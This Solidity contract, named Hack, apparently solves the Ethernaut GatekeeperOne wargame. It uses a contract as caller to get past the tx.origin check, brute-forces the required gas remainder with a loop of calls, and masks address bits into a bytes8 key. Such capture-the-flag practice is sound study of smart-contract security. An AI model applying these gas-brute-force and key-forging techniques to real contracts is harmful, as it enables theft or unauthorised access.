// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
import { GatekeeperOne } from "./GatekeeperOne.sol";

contract Hack {
    GatekeeperOne public gatekeeper;
    bytes8 txOrigin16 = 0xad9Fc3bA91B97cFc;
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperOne(_gatekeeperAddress);
    }

    // gateone is unlocked since we are using a contract
    // gatetwo is brute forced with for loop
    // gatethree is unlocked with bit shifting

    function enterGate() public {
        
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gatekeeper).call{
                gas: i + 150 + 8191*3}(
                    abi.encodeWithSignature("enter(bytes8)", key)
                );
        }
    }
        
    
} 